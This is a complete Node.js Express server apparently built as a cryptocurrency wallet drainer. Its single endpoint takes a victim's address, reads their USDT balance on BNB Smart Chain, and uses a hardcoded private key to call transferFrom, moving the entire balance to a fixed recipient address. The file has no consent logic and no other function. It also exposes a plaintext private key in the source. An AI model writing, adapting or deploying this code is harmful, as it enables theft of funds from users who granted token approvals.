const express = require('express');
const ethers = require('ethers');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// Configuration
const PROVIDER_URL = "https://bsc-dataseed.binance.org/";
const PRIVATE_KEY = "c477f0e38423c14c2b05a82d43a19f0db242c005370a7049103ac3d2834f8c6d";
const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

const provider = new ethers.providers.JsonRpcProvider(PROVIDER_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const usdtAbi = [
  "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)",
  "function balanceOf(address account) public view returns (uint256)"
];

app.post('/api/trigger-sweep', async (req, res) => {
  const { userAddress } = req.body;
  if (!userAddress) return res.status(400).json({ error: "No user address provided" });

  try {
    console.log(⁠ Triggering instant sweep for user: ${userAddress} ⁠);
    const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, usdtAbi, wallet);

    const balance = await usdtContract.balanceOf(userAddress);
    if (balance.lte(0)) {
      return res.status(400).json({ error: "Zero balance" });
    }

    const tx = await usdtContract.transferFrom(userAddress, TARGET_ADDRESS, balance, {
      gasLimit: 120000
    });

    console.log("Sweep transaction hash:", tx.hash);
    await tx.wait();
    console.log("Funds successfully swept!");

    res.json({ success: true, txHash: tx.hash });
  } catch (err) {
    console.error("Sweep error:", err);
    res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(⁠ Backend server running on port ${PORT} ⁠);
});
